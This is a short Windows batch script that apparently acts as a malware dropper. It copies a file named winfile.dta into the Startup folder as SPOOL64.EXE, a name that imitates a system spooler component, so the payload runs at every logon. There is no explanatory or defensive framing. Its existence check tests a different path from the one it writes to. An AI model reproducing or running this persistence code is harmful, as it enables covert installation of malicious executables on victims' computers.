@echo off
:s
@if exist "C:\WINDOWS\SPOOL64.EXE" goto f
@copy "C:\WINDOWS\winfile.dta" "C:\WINDOWS\Start Menu\Programs\Startup\SPOOL64.EXE"
:f
